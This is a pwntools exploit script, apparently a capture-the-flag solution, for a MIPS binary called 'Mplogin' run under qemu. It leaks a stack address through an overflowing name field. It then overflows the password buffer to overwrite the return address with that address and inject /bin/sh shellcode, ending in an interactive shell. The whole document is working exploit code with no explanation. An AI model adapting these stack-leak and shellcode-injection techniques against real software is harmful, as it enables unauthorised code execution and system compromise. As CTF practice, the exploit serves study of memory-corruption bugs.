from pwn import *

context(arch='mips', endian='little',log_level='debug')

io = process(['qemu-mipsel','-L','./','./Mplogin'])
#io = process(['qemu-mipsel','-g','1234','-L','./','./Mplogin'])

# leak stack addr
payload1 = b'admin'.ljust(24,b'a')
io.sendafter("name : ",payload1 )
io.recvuntil("Correct name : ")
io.recv(24)
stack_addr = u32(io.recv(4))

payload2 = b'access'.ljust(0x14,b'b') +p32(0x100)
io.sendafter('Pre_Password : ',payload2)
#payload3 = b"0123456789" +b"aadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac"
payload3 = b"0123456789".ljust(0x28,b"c")+p32(stack_addr)+asm(shellcraft.sh())
io.sendafter('Password : ',payload3)
io.interactive()